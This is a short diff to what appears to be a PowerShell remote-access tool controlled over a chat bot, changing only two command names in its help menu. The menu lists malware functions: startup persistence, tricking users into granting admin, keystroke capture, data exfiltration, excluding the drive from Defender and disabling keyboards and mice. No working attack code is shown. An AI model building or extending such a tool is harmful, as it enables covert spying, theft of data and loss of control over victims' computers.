@@ -79,7 +79,7 @@ Remove-Persistance   : Remove Startup Persistance
 Is-Admin   : Checks if session has admin Privileges
 Attempt-Elevate  : Send user a prompt to gain Admin
 Message   : Send a message to connected computer
-Kill    : Killswitch for 'KeyCapture' and 'Exfiltrate' 
+Kill    : Killswitch for 'Key-Capture' and 'Exfiltrate' 
 **ADMIN ONLY FUNCTIONS**
 Disable-AV   : Attempt to exclude C:/ from Defender
 Disable-HID   : Disable Mice and Keyboards
@@ -112,7 +112,7 @@ cfg, conf, docx, rft.
 
 ==========  Upload Command Examples ===========
 (PS`> Upload -Path C:/Path/To/File.txt)
-Use 'FolderTree' command to show all files
+Use 'Folder-Tree' command to show all files
 
 =============================================="
 $params = @{chat_id = $ChatID ;text = $contents}
